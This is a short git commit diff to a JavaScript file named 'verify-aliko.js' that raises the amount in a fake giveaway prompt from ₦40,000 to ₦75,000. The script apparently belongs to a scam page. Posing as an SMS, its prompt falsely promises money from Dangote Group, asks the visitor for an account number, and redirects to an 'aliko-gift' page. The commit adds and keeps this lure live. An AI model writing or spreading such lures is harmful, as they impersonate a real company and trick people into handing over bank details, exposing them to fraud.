efc10fcd1e9119b1f0bc947ae34f1aa436d5691a
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-05-09 03:59:38 -0700

    Update verify-aliko.js

--- verify-aliko.js
+++ verify-aliko.js
@@ -1,5 +1,5 @@
-var password = 'WITHDRAW ₦40,000'
-password=prompt('SMS: Congratulations, you are eligible to receive ₦40,000 From Dangote Group, click OK to Enter Your Acc. Number','WITHDRAW ₦40,000');
-if (password != 'WITHDRAW ₦40,000') {
+var password = 'WITHDRAW ₦75,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦75,000 From Dangote Group, click OK to Enter Your Acc. Number','WITHDRAW ₦75,000');
+if (password != 'WITHDRAW ₦75,000') {
 location.href='https://isoiba.com/aliko-gift.html';
 }
